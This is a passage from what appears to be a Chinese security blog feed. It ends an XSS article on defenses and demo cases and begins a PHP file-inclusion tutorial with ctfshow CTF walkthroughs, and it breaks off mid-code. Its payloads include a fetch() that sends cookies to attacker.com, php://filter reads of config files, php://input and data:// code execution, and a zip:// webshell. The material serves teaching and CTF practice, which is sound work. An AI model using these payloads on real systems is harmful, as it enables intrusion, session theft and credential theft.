在服务器端（和必要时在客户端）对用户输入进行<strong>严格的格式和内容检查</strong>。</li><li><strong>怎么做：</strong><ul><li>使用<strong>白名单</strong>策略：只允许已知安全的字符集和结构（例如，姓名字段只允许字母、空格和连字符；邮箱字段必须符合邮箱格式）。</li><li>使用<strong>黑名单</strong>策略要极其谨慎（容易被绕过），仅作为白名单的补充。</li><li>验证数据的类型、长度、格式和范围。</li><li>使用强大的正则表达式进行匹配。</li></ul></li><li><strong>注意：</strong> 输入验证是重要的第一道防线，但<strong>不能单独</strong>防御 XSS，因为很多合法输入也可能包含有特殊含义的字符（如评论中讨论 HTML 代码本身）。必须结合输出编码。</li></ul></li><li><p><strong>输出编码 (Output Encoding &#x2F; Context-Aware Escaping):</strong></p><ul><li><strong>核心防御手段！</strong> 这是最有效、最根本的防御措施。</li><li><strong>目的：</strong> 在将<strong>不可信的数据</strong>（来自用户、数据库、第三方 API 等）<strong>动态嵌入</strong>到 HTML 文档的不同位置（上下文）时，对其进行转义，将其中具有特殊含义的字符（如 <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>&quot;</code>, <code>&#39;</code>, <code>/</code>）转换为安全的 HTML 实体（如 <code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;amp;</code>, <code>&amp;quot;</code>, <code>&amp;#x27;</code>, <code>&amp;#x2F;</code>），使浏览器将其视为纯文本数据，而不是可执行的代码或 HTML 标签的一部分。</li><li><strong>关键：上下文感知！</strong> 转义规则<strong>必须</strong>根据数据将要被插入的位置来决定：<ul><li><strong>HTML Body 上下文 (在标签之间)：</strong> 转义 <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>&quot;</code>, <code>&#39;</code>。例如：<code>&lt;div&gt;用户输入：</code> + <code>escapeHtml(userInput)</code> + <code>&lt;/div&gt;</code></li><li><strong>HTML 属性值上下文：</strong> 转义 <code>&quot;</code>, <code>&#39;</code>, <code> </code> (空格可能导致属性提前结束)，有时还要转义 <code>/</code>。始终用引号（单或双）包裹属性值。例如：<code>&lt;input type=&quot;text&quot; value=&quot;</code> + <code>escapeHtmlAttr(userInput)</code> + <code>&quot;&gt;</code></li><li><strong>JavaScript 上下文 (在 <code>&lt;script&gt;</code> 标签内或在事件处理程序中)：</strong> 这是最危险的。必须将不可信数据放入引号（单&#x2F;双）中，并对其中的引号、换行符等进行转义（使用 <code>\</code>）。**强烈建议避免**在 JavaScript 中直接拼接 HTML 或使用 <code>eval()</code>&#x2F;<code>innerHTML</code>。使用 <code>JSON.stringify()</code> 并确保输出在正确的 <code>&lt;script&gt;</code> 块中。或者更安全地，通过安全的 API 操作 DOM（如 <code>textContent</code>）。</li><li><strong>CSS 上下文：</strong> 转义特殊字符，严格验证数据。避免使用不可信数据构造完整的 CSS 属性值或 URL。</li><li><strong>URL 上下文 (在 href&#x2F;src 属性中)：</strong> 验证 URL 协议（白名单 <code>http:</code>, <code>https:</code>，拒绝 <code>javascript:</code>）。使用安全的 URL 编码函数。</li></ul></li><li><strong>实施：</strong><ul><li>使用成熟的、经过安全审计的<strong>编码库</strong>（如 OWASP ESAPI、DOMPurify (用于 HTML&#x2F;SVG)、框架内置的编码函数（如 PHP 的 <code>htmlspecialchars</code>, Python Django 的模板自动转义, React&#x2F;Vue&#x2F;Angular 的默认数据绑定机制）。</li><li><strong>绝对避免</strong>手动拼接字符串构造 HTML 或 JavaScript！</li><li>框架使用者：理解并信任框架的默认安全机制（如 React 的 JSX 转义），但要知道其边界（使用 <code>dangerouslySetInnerHTML</code> 时需极其小心并手动净化）。</li></ul></li></ul></li><li><p><strong>使用安全的 API 操作 DOM (针对 DOM XSS):</strong></p><ul><li><strong>避免：</strong> <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write()</code>, <code>document.writeln()</code>, <code>eval()</code>, <code>setTimeout(string)</code>, <code>setInterval(string)</code>, <code>new Function(string)</code>。</li><li><strong>推荐：</strong><ul><li>使用 <code>textContent</code> 或 <code>innerText</code> 设置纯文本内容。</li><li>使用 <code>setAttribute()</code> 设置属性值（确保值已编码）。</li><li>使用 <code>addEventListener()</code> 绑定事件处理器，而不是使用 <code>on事件</code> 属性（如 <code>onclick=&quot;...&quot;</code>）。</li><li>创建 DOM 节点时，使用 <code>document.createElement()</code>, <code>appendChild()</code>, <code>createTextNode()</code> 等安全的 API。</li><li>如果必须插入 HTML，<strong>先净化 (Sanitize)</strong>：使用专门的库（如 <strong>DOMPurify</strong>）来移除或转义所有危险的标签和属性，只保留安全的子集（白名单）。</li></ul></li></ul></li><li><p><strong>设置安全的 Cookie 属性：</strong></p><ul><li><strong><code>HttpOnly</code>:</strong> 设置为 <code>true</code>。阻止 JavaScript 通过 <code>document.cookie</code> 访问 Cookie，使得即使发生 XSS 也难以直接窃取会话 Cookie。</li><li><strong><code>Secure</code>:</strong> 设置为 <code>true</code>。确保 Cookie 只通过 HTTPS 加密连接传输。</li><li><strong><code>SameSite</code>:</strong> 设置为 <code>Strict</code> 或 <code>Lax</code>。有助于防御 CSRF 攻击，并在一定程度上增加 XSS 利用难度（限制 Cookie 随跨站请求发送）。<code>Strict</code> 最安全但可能影响用户体验（如从邮件链接点进来会丢失登录态），<code>Lax</code> 是较常用的平衡选择。</li></ul></li><li><p><strong>内容安全策略 (Content Security Policy - CSP):</strong></p><ul><li><strong>强大的深度防御机制。</strong></li><li><strong>原理：</strong> 通过 HTTP 响应头 (<code>Content-Security-Policy</code>) 告诉浏览器<strong>哪些来源的资源（脚本、样式、图片、字体、AJAX 请求、框架等）是可信的，可以被加载和执行</strong>。</li><li><strong>如何防御 XSS：</strong><ul><li><strong>禁止内联脚本：</strong> <code>&#39;unsafe-inline&#39;</code> 是一个危险的关键字，应避免使用。禁止内联 <code>&lt;script&gt;</code> 块和 <code>on事件</code> 属性。强制所有脚本必须通过 <code>src</code> 属性从受信任的域加载。这能有效阻止大多数反射型和存储型 XSS 攻击者注入的脚本执行。</li><li><strong>禁止 <code>eval()</code> 及类似函数：</strong> <code>&#39;unsafe-eval&#39;</code> 也应避免。</li><li><strong>限制脚本来源：</strong> 使用 <code>script-src</code> 指令精确指定允许加载 JavaScript 的域名或哈希值&#x2F;随机数。例如：<code>script-src &#39;self&#39; https://trusted-cdn.com;</code></li><li><strong>启用报告：</strong> 使用 <code>report-uri</code> 或 <code>report-to</code> 指令收集策略违规报告，帮助发现潜在攻击或配置问题。</li></ul></li><li><strong>实施：</strong> 需要仔细配置策略，否则可能破坏网站功能。建议从较宽松的策略开始（如 <code>default-src &#39;self&#39;</code>），逐步收紧，并利用浏览器控制台和报告机制调试。</li></ul></li><li><p><strong>其他防御措施：</strong></p><ul><li><strong>输入净化 (Input Sanitization)：</strong> 在特定场景（如富文本编辑器 WYSIWYG），需要允许一些安全的 HTML 标签（如 <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>, <code>&lt;a&gt;</code>）。此时必须使用强大的 HTML 净化库（如 <strong>DOMPurify</strong>, <strong>jsoup (Java)</strong>, <strong>HTMLPurifier (PHP)</strong>），基于严格的白名单移除或转义所有危险的标签和属性（如 <code>&lt;script&gt;</code>, <code>on事件</code>, <code>javascript:</code>）。</li><li><strong>框架的自动防护：</strong> 现代 Web 框架（如 React, Vue, Angular, Ruby on Rails, Django）通常内置了基本的 XSS 防护（如自动转义模板变量）。<strong>但开发者不能完全依赖于此！</strong> 需要理解其工作原理和局限性（例如，使用 <code>dangerouslySetInnerHTML</code> 或 <code>v-html</code> 时需要手动净化）。</li><li><strong>Web 应用防火墙 (WAF)：</strong> 可以作为缓解措施，通过规则匹配拦截常见的 XSS 攻击载荷。但它<strong>不是根本解决方案</strong>，存在被绕过（如编码变形）的可能，且可能产生误报&#x2F;漏报。应将其视为纵深防御的一层。</li><li><strong>定期安全测试：</strong> 进行渗透测试、代码审计、使用自动化漏洞扫描工具（如 OWASP ZAP, Burp Suite）来主动发现 XSS 漏洞。</li><li><strong>安全编码培训：</strong> 提高开发人员的安全意识和技能。</li></ul></li></ol><h2 id="六、实践案例-简单演示"><a href="#六、实践案例-简单演示" class="headerlink" title="六、实践案例 (简单演示)"></a>六、实践案例 (简单演示)</h2><h3 id="案例-1：反射型-XSS-通过-URL-参数"><a href="#案例-1：反射型-XSS-通过-URL-参数" class="headerlink" title="案例 1：反射型 XSS (通过 URL 参数)"></a>案例 1：反射型 XSS (通过 URL 参数)</h3><ul><li><strong>漏洞页面 (search.php):</strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$searchTerm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>]; <span class="hljs-comment">// 直接获取 URL 参数，未转义！</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;搜索结果： <span class="hljs-subst">$searchTerm</span>&lt;/h1&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><strong>攻击者构造的 URL:</strong><br><code>http://victim-site.com/search.php?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li><li><strong>防御 (修复后 search.php):</strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$searchTerm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>];<br><span class="hljs-variable">$safeSearchTerm</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$searchTerm</span>, ENT_QUOTES, <span class="hljs-string">&#x27;UTF-8&#x27;</span>); <span class="hljs-comment">// 关键：输出编码</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;搜索结果： <span class="hljs-subst">$safeSearchTerm</span>&lt;/h1&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="案例-2：存储型-XSS-通过评论"><a href="#案例-2：存储型-XSS-通过评论" class="headerlink" title="案例 2：存储型 XSS (通过评论)"></a>案例 2：存储型 XSS (通过评论)</h3><ul><li><strong>漏洞页面 (comment.php 和 show_comments.php):</strong><ul><li><code>comment.php</code>: 接收评论表单提交 (<code>POST</code>)，未充分验证&#x2F;转义就存入数据库。</li><li><code>show_comments.php</code>: 从数据库读取评论，未转义就直接输出到页面：<code>echo $comment[&#39;text&#39;];</code></li></ul></li><li><strong>攻击者提交的评论:</strong><br><code>&lt;script&gt;fetch(&#39;https://attacker.com/steal?cookie=&#39; + document.cookie);&lt;/script&gt;</code></li><li><strong>防御：</strong><ol><li><code>comment.php</code> 后端：可进行输入验证（限制长度、字符），但<strong>核心防御在输出时</strong>。</li><li><code>show_comments.php</code>:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$comments</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$comment</span>) &#123;<br>    <span class="hljs-variable">$safeText</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$comment</span>[<span class="hljs-string">&#x27;text&#x27;</span>], ENT_QUOTES, <span class="hljs-string">&#x27;UTF-8&#x27;</span>); <span class="hljs-comment">// 输出编码</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div class=&#x27;comment&#x27;&gt;<span class="hljs-subst">$safeText</span>&lt;/div&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li>如果允许富文本评论，则需要在存储或输出前使用 HTML 净化器 (如 HTMLPurifier)。</li></ol></li></ul><h3 id="案例-3：基于-DOM-的-XSS-通过-location-hash"><a href="#案例-3：基于-DOM-的-XSS-通过-location-hash" class="headerlink" title="案例 3：基于 DOM 的 XSS (通过 location.hash)"></a>案例 3：基于 DOM 的 XSS (通过 location.hash)</h3><ul><li><strong>有漏洞的客户端代码 (vulnerable.js):</strong><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">displayWelcome</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> username = location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// 从 URL 片段获取用户名</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;welcomeMessage&#x27;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;Welcome, &quot;</span> + username + <span class="hljs-string">&quot;!&quot;</span>; <span class="hljs-comment">// 危险！使用 innerHTML</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><strong>攻击者构造的 URL:</strong><br><code>http://victim-site.com/dashboard#&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;</code></li><li><strong>防御 (修复后 vulnerable.js):</strong><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">displayWelcome</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> username = location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 使用安全的 textContent 设置纯文本</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;welcomeMessage&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">&quot;Welcome, &quot;</span> + username + <span class="hljs-string">&quot;!&quot;</span>;<br>&#125;<br><span class="hljs-comment">// 或者，如果必须显示 HTML（不推荐），使用 DOMPurify:</span><br><span class="hljs-comment">// import DOMPurify from &#x27;dompurify&#x27;; // 假设已引入库</span><br><span class="hljs-comment">// var safeUsername = DOMPurify.sanitize(username); // 净化</span><br><span class="hljs-comment">// document.getElementById(&#x27;welcomeMessage&#x27;).innerHTML = &quot;Welcome, &quot; + safeUsername + &quot;!&quot;;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><ul><li><strong>XSS 是注入攻击：</strong> 将恶意脚本注入到受信任的网页中。</li><li><strong>危害巨大：</strong> 可窃取会话、数据、冒充用户、传播恶意软件等。</li><li><strong>三大类型：</strong> 反射型（通过恶意 URL）、存储型（存储在服务器）、DOM 型（纯客户端）。</li><li><strong>根本原因：</strong> 将<strong>不可信的用户输入</strong>未经<strong>正确的上下文感知输出编码</strong>或<strong>安全净化</strong>就直接嵌入到 HTML&#x2F;JS 上下文中。</li><li><strong>核心防御：</strong><ul><li><strong>对所有输出进行上下文感知的转义&#x2F;编码！</strong> (最重要)</li><li><strong>输入验证</strong>（作为补充）。</li><li><strong>使用安全的 DOM API</strong>（避免 <code>innerHTML</code>&#x2F;<code>eval</code> 等）。</li><li><strong>设置 Cookie <code>HttpOnly</code> 和 <code>Secure</code>。</strong></li><li><strong>实施严格的内容安全策略 (CSP)</strong>（尤其禁止内联脚本和 <code>eval</code>）。</li><li><strong>在允许 HTML 时使用成熟的净化库。</strong></li></ul></li><li><strong>持续警惕：</strong> XSS 是 Web 安全中最常见也最危险的漏洞之一。防御需要开发者在整个应用生命周期（设计、编码、测试、部署）中始终保持安全意识，并采用纵深防御策略。</li></ul><p>理解 XSS 的原理和防御方法对于构建安全的 Web 应用至关重要。永远记住：<strong>不要信任用户输入！</strong> 输出前必须进行适当的编码或净化。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2025/06/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2025/06/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h2 id="文件包含函数-php"><a href="#文件包含函数-php" class="headerlink" title="文件包含函数(php):"></a>文件包含函数(php):</h2><p><strong>include($file)</strong>:包含文件，出错时仅报警告（E_WARNING），程序继续执行。</p><p><strong>require($file)</strong>:包含文件，出错时报致命错误（E_COMPILE_ERROR），程序终止。</p><p><strong>include_once($file)</strong>:与 include 类似，但会先检查文件是否已被包含，避免重复包含。</p><p><strong>require_once($file)</strong>:与 require 类似，但会先检查文件是否已被包含，避免重复包含。</p><p><strong>file_get_contents($file)</strong>:读取整个文件内容到字符串，可配合 allow_url_fopen 读取远程文件。</p><h2 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数:"></a>动态执行函数:</h2><p><strong>eval($code)</strong>:执行字符串形式的 PHP 代码（如 eval(“echo ‘hello’;”);）。</p><p><strong>system($cmd)</strong>:执行系统命令并输出结果（如 system(“ls -l”);）。</p><p><strong>exec($cmd)</strong>:执行系统命令并返回结果的最后一行（如 exec(“whoami”);）。</p><p><strong>shell_exec($cmd)</strong>:通过 shell 执行命令，返回完整输出（如 <code>ls -l</code> 或 shell_exec(“ls”);）。</p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>伪协议是 PHP 提供的流封装器（Stream Wrappers），允许通过标准文件函数（如 include、file_get_contents）访问：</p><p>格式：&lt;协议&gt;:&#x2F;&#x2F;&lt;路径&gt;（如 php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php）</p><p>当存在文件包含漏洞时（如 include($_GET[‘file’])），伪协议能：</p><p>1.绕过路径限制<br>（无法直接包含非脚本文件时）</p><p>2.读取源码<br>（<strong>避免被 PHP 解析执行</strong>）</p><p>3.实现远程代码执行（<strong>RCE</strong>）<br>（无需文件上传）</p><p>4.利用压缩包&#x2F;临时文件<br>（隐藏恶意代码）</p><hr><h3 id="🌟-一句话理解伪协议"><a href="#🌟-一句话理解伪协议" class="headerlink" title="🌟 一句话理解伪协议"></a>🌟 一句话理解伪协议</h3><blockquote><p><strong>伪协议 &#x3D; 给PHP的「特殊指令」</strong><br>告诉它不要简单打开文件，而是用特殊方式处理文件（比如解码&#x2F;执行代码&#x2F;读取压缩包）</p></blockquote><hr><h3 id="🧩-文件包含漏洞是什么？"><a href="#🧩-文件包含漏洞是什么？" class="headerlink" title="🧩 文件包含漏洞是什么？"></a>🧩 文件包含漏洞是什么？</h3><p>假设有段危险代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">// 比如用户访问：http://site.com/?file=header.php</span><br></code></pre></td></tr></table></figure><p>黑客如果把<code>file</code>参数改成<strong>伪协议指令</strong>，就能让PHP执行危险操作！</p><hr><h3 id="🛠️-五大伪协议详解（新手版）"><a href="#🛠️-五大伪协议详解（新手版）" class="headerlink" title="🛠️ 五大伪协议详解（新手版）"></a>🛠️ 五大伪协议详解（新手版）</h3><h4 id="1️⃣-php-filter（文件内容阅读器）"><a href="#1️⃣-php-filter（文件内容阅读器）" class="headerlink" title="1️⃣ php://filter（文件内容阅读器）"></a>1️⃣ <code>php://filter</code>（文件内容阅读器）</h4><p><strong>作用</strong>：<strong>读取文件源代码</strong>（不让PHP执行它）<br><strong>使用场景</strong>：偷看网站的配置文件（数据库密码等）<br><strong>实战示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=php://filter/convert.base64-encode/resource=config.php<br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：看到<code>config.php</code>的Base64编码内容 → 解码后获得密码  </p><blockquote><p>📌 就像对快递员说：“别送包裹了！把里面的信<strong>拍照发我</strong>”（避免拆包裹触发炸弹）</p></blockquote><hr><h4 id="2️⃣-php-input（代码植入器）"><a href="#2️⃣-php-input（代码植入器）" class="headerlink" title="2️⃣ php://input（代码植入器）"></a>2️⃣ <code>php://input</code>（代码植入器）</h4><p><strong>作用</strong>：<strong>把POST请求体中的代码当作文件执行</strong><br><strong>使用场景</strong>：直接控制服务器执行命令</p><p><strong>用法</strong>：url加上php:&#x2F;&#x2F;input，同时post传参，bp抓包把post内容改成命令即可<br><strong>实战示例</strong>： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://site.com/?file=php://input&quot;</span> -d <span class="hljs-string">&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：服务器执行<code>ls</code>命令，列出文件  </p><blockquote><p>📌 就像把快递员打晕，<strong>把自己的炸弹塞进包裹</strong>让他配送</p></blockquote><hr><h4 id="3️⃣-data-（代码直插器）"><a href="#3️⃣-data-（代码直插器）" class="headerlink" title="3️⃣ data://（代码直插器）"></a>3️⃣ <code>data://</code>（代码直插器）</h4><p><strong>作用</strong>：<strong>直接在URL里写代码执行</strong><br><strong>使用场景</strong>：快速测试代码执行<br><strong>实战示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=data://text/plain,&lt;?php echo &#x27;HACKED!&#x27;; ?&gt;<br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：页面显示 <code>HACKED!</code>  </p><blockquote><p>📌 就像打电话时说：“别收快递了！我<strong>现场给你个炸弹</strong>，立刻引爆！”</p></blockquote><hr><h4 id="4️⃣-zip-（压缩包提取器）"><a href="#4️⃣-zip-（压缩包提取器）" class="headerlink" title="4️⃣ zip://（压缩包提取器）"></a>4️⃣ <code>zip://</code>（压缩包提取器）</h4><p><strong>作用</strong>：<strong>执行压缩包里的PHP文件</strong><br><strong>使用场景</strong>：绕过文件上传检查<br><strong>实战步骤</strong>：</p><ol><li>创建 <code>shell.php</code> 内容 <code>&lt;?php system(&#39;id&#39;); ?&gt;</code></li><li>压缩成 <code>evil.zip</code></li><li>上传到服务器</li><li>触发：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=zip:///var/www/uploads/evil.zip%23shell.php<br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：执行压缩包中的恶意代码  </p><blockquote><p>📌 就像寄送<strong>伪装成玩具的炸弹</strong>，让快递员从玩具箱里取出炸弹</p></blockquote><hr><h4 id="5️⃣-phar-（高级压缩提取器）"><a href="#5️⃣-phar-（高级压缩提取器）" class="headerlink" title="5️⃣ phar://（高级压缩提取器）"></a>5️⃣ <code>phar://</code>（高级压缩提取器）</h4><p>类似 <code>zip://</code>，但支持更多格式（如PHAR、TAR）  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=phar:///uploads/evil.phar/internal.php<br></code></pre></td></tr></table></figure><hr><h3 id="🛡️-为什么防御难？"><a href="#🛡️-为什么防御难？" class="headerlink" title="🛡️ 为什么防御难？"></a>🛡️ 为什么防御难？</h3><p>伪协议利用了PHP的<strong>合法功能</strong>，防御需主动关闭：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 在php.ini中关闭危险设置</span><br><span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">Off</span><br><span class="hljs-attr">allow_url_fopen</span> = <span class="hljs-literal">Off</span><br></code></pre></td></tr></table></figure><hr><h2 id="本地文件包含漏洞（LFI-Local-File-Inclusion）"><a href="#本地文件包含漏洞（LFI-Local-File-Inclusion）" class="headerlink" title="本地文件包含漏洞（LFI, Local File Inclusion）"></a>本地文件包含漏洞（LFI, Local File Inclusion）</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>1.&#x2F;?file&#x3D;..&#x2F;..&#x2F;flag.php 报错的原因:</strong></p><p> <em><strong>Warning</strong>:  include(&#x2F;…&#x2F;www&#x2F;html&#x2F;index.php): failed to open stream: No such file or directory in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>17</strong></em></p><p> <em><strong>Warning</strong>:  include(): Failed opening ‘&#x2F;…&#x2F;www&#x2F;html&#x2F;index.php’ for inclusion (include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’) in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>17</strong></em></p><p><strong>路径问题</strong>：..&#x2F;..&#x2F;flag.php 是相对路径，表示”向上两级目录中的flag.php”</p><p><strong>安全机制</strong>：PHP的 open_basedir 限制会阻止访问系统文件（常见于CTF环境）</p><p><strong>路径转换</strong>：PHP将相对路径转为绝对路径时，超出允许范围的路径会被替换为 &#x2F;…&#x2F;（安全占位符）</p><p><strong>根本原因</strong>：实际路径可能是 &#x2F;var&#x2F;www&#x2F;..&#x2F;..&#x2F;flag.php → 解析为 &#x2F;flag.php（根目录），而服务器禁止访问根目录</p><p><strong>关键点</strong>：这不是文件不存在，而是路径被安全机制拦截</p><p><strong>2.&#x2F;?file&#x3D;flag.php 显示空白的原因:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// flag.php 实际内容</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;ctfshow&#123;...&#125;&quot;</span>;  <span class="hljs-comment">// 没有输出语句！</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>include机制</strong>：当包含 .php 文件时，PHP会执行其中的代码，而非显示源码</p><p><strong>执行而非读取</strong>：</p><p>​    include(“flag.php”) 会执行 $flag&#x3D;”…” 的赋值操作</p><p>​    但该文件没有 echo&#x2F;print 语句 → 无任何输出</p><p>​    赋值操作在内存中完成，浏览器不可见</p><p><strong>空白页面</strong> &#x3D; 包含成功 + 文件无输出内容</p><p><strong>3.?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php成功的原因：</strong></p><p><strong>绕过执行</strong>：</p><p>​    php:&#x2F;&#x2F;filter 将文件视为数据流而非代码</p><p>​    resource&#x3D;flag.php 指定读取目标文件</p><p><strong>编码转换</strong>：</p><p>​    convert.base64-encode 对文件内容进行Base64编码</p><p>​    将二进制数据转为纯ASCII字符（A-Z a-z 0-9 +&#x3D;）</p><p><strong>安全输出</strong>：</p><p>​    编码后的内容不包含 <?php ?> 等标签</p><p>​    PHP引擎将其视为普通文本而非代码 → 直接输出到页面</p><p><strong>最终结果</strong>：</p><p>​    页面显示Base64编码的源码：PD9waHAgJGZsYWc9ImN0ZnNob3d7…</p><p>​    解码后得到原始代码</p><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p><em>$file &#x3D; str_replace(“php”, “???”, $file);</em> </p><p>改用base64编码php即可(没有&#x2F;i可以用大小写绕过)</p><p>获取flag： ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p><em>$file &#x3D; str_replace(“php”, “???”, $file);   $file &#x3D; str_replace(“data”, “???”, $file);</em> </p><p>用input协议，?file&#x3D;Php:&#x2F;&#x2F;input，抓post包，把post改成php语句即可运行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span 